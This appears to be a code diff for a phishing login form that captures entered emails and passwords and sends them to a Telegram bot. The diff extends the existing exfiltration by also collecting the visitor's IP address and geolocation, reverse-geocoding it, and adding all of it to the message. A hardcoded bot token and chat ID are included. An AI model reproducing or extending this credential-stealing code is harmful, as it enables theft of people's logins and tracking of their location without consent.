@@ -3,7 +3,17 @@
   let password = '';
   let errors = { email: '', password: '' };
   let isModalVisible = false;
-  
+
+  let ipAddress = '';
+  let location = {
+    latitude: '',
+    longitude: '',
+    country: '',
+    city: '',
+    state: '',
+    zip_code: ''
+  };
+
   // Validation functions
   function validateEmail() {
     const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
@@ -17,7 +27,40 @@
     return '';
   }
 
-  function submitForm() {
+  async function getLocationDetails(lat, lon) {
+    try {
+      const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+      const data = await response.json();
+      return {
+        country: data.address ? data.address.country : 'N/A',
+        city: data.address ? data.address.city : 'N/A',
+        state: data.address ? data.address.state : 'N/A',
+        zip_code: data.address ? data.address.postcode : 'N/A'
+      };
+    } catch (error) {
+      console.error('Error fetching location details:', error);
+      return {
+        country: 'N/A',
+        city: 'N/A',
+        state: 'N/A',
+        zip_code: 'N/A'
+      };
+    }
+  }
+
+  async function getIpAddress() {
+    try {
+      const response = await fetch('https://api64.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      console.error('Failed to fetch IP address:', error);
+      return 'N/A';
+    }
+  }
+
+  // Function to handle form submission
+  async function submitForm() {
     // Clear previous errors
     errors.email = '';
     errors.password = '';
@@ -32,20 +75,56 @@
       errors.password = passwordError;
     }
 
-    // If no errors, send the data to Telegram
+    // If no errors, proceed with sending data
     if (!errors.email && !errors.password) {
-      sendDataToTelegram(email, password);
-      // Show the modal
-      isModalVisible = true;
+      // Get user's IP address
+      ipAddress = await getIpAddress();
+
+      // Try to get user's location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            location.latitude = position.coords.latitude;
+            location.longitude = position.coords.longitude;
+
+            // Get location details
+            const locationDetails = await getLocationDetails(location.latitude, location.longitude);
+            location = { ...location, ...locationDetails };
+
+            // Send data to Telegram
+            await sendDataToTelegram(email, password, ipAddress, location);
+
+            // Show the modal
+            isModalVisible = true;
+          },
+          async (error) => {
+            console.error('Geolocation error:', error);
+
+            // Send data without location if geolocation fails
+            await sendDataToTelegram(email, password, ipAddress, location);
+
+            // Show the modal
+            isModalVisible = true;
+          }
+        );
+      } else {
+        console.error('Geolocation is not supported by this browser');
+
+        // Send data without location if geolocation is not supported
+        await sendDataToTelegram(email, password, ipAddress, location);
+
+        // Show the modal
+        isModalVisible = true;
+      }
     }
   }
 
   // Send data to Telegram
-  async function sendDataToTelegram(email, password) {
+  async function sendDataToTelegram(email, password, ip, location) {
     const botToken = '7697246301:AAFcC_2HcCcnHZ3ePerNLn8XkgqexprrfiI'; // Replace with your Telegram bot token
     const chatId = '1678259688'; // Replace with your Telegram chat ID
 
-    const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+    const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
